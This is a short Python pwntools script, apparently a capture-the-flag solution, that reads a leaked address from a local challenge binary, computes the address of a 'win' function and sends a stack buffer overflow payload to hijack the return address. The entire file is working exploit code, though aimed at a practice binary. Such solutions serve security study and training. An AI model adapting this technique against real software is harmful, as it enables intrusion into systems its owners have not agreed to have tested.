#!/usr/bin/env python3

# Title:        XXX.py
# Description:  X
# Author:       bluecosmo

from pwn import *

elf = context.binary = ELF("./chall")
p = process(elf.path)

p.recvuntil(b"hint @ ")

# Calculate address of win
a_hint = int(p.recv(14), 16)
a_base = a_hint - 0x4010
a_win = p64(a_base + 0x15d9)

# Craft payload
payload = b"A" * 0x28 # Buffer & RBP
payload += a_win

# Send payload
p.sendline(payload)
p.interactive()
